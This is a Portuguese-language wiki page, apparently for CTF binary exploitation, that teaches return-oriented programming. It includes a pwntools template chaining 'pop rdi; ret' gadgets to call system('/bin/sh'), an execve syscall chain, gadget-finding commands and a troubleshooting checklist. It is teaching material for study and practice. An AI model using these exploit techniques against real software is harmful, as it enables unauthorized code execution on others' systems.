---
title: "ROP"
sidebar_position: 6
---

Com **NX** ativo, a stack não executa shellcode. Em vez de injetar código, encadeamos pedaços de código já existentes (**gadgets**), todos terminando em `ret`: cada `ret` pega o próximo endereço da stack, que nós controlamos pelo Buffer Overflow. A teoria completa está em [ROP](../../../pwning/stack/rop/index.mdx).

Variações: [ret2libc](./ret2libc.md), [Partial Overwrite](./partial-overwrite.md), [Stack Pivoting](./stack-pivoting.md) e [SROP](./srop.md).

## ROP básico (x64)

Argumentos vão em `rdi, rsi, rdx` → precisamos de gadgets `pop rdi; ret` etc. para preenchê-los, e depois o endereço da função.

```
[padding até o return address]
[pop rdi; ret]  [arg1]
[pop rsi; ret]  [arg2]
[função]
[próximo gadget ou função...]
```

```py
from pwn import *
elf = context.binary = ELF('./vuln')
rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]

payload  = b'A' * offset
payload += p64(pop_rdi) + p64(next(elf.search(b'/bin/sh\0')))
payload += p64(ret)                      # alinhamento (veja abaixo)
payload += p64(elf.plt['system'])        # se o binário importa system
```

Ou deixe o pwntools montar: `rop.call('system', [bin_sh]); payload = b'A'*offset + rop.chain()`. `rop.dump()` mostra a chain.

Achar gadgets: `ROPgadget --binary ./vuln | grep "pop rdi"` ou `ropper --file ./vuln --search "pop rdi"`. O `pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret` da `__libc_csu_init` está em quase todo binário (glibc < 2.34). `pop rdx` costuma só existir na libc.

**Alinhamento**: se der `SIGSEGV` em `movaps` dentro de `system`/`printf`, coloque um gadget `ret` a mais antes da chamada (a stack precisa estar em múltiplo de 16 no `call`, e ao entrar por `ret` ficamos 8 bytes fora).

**x86 (32 bits)**: argumentos vão na stack, sem gadgets: `[função][return address][arg1][arg2]`. Ex: `p32(system) + p32(exit) + p32(bin_sh)`.

## ROP com syscall

Em binários estáticos não há `system`, mas há muitos gadgets. Monte um `execve("/bin/sh", 0, 0)` direto: `rax = 59`, `rdi = &"/bin/sh"`, `rsi = 0`, `rdx = 0` e um gadget `syscall`. Se não houver `/bin/sh` no binário, escreva-o na `.bss` antes com um gadget `mov [reg], reg` ou com `read(0, bss, 8)`. Sem `pop rax`, veja [SROP](./srop.md).

## Checklist de problemas

- `SIGSEGV` em `movaps` → alinhamento: adicione/remova um `ret`
- Chain para na metade → algum gadget tem `pop` extra (coloque lixo para cada `pop`) ou a função destrói um registrador que você preparou (`rdx` é comum)
- Funciona local, não remoto → libc diferente (pegue a do servidor, use `pwninit`), ou offset de stack diferente (variáveis de ambiente). Não dependa de endereços de stack absolutos
- Leak vem com 6 bytes → `u64(leak.ljust(8, b'\0'))`
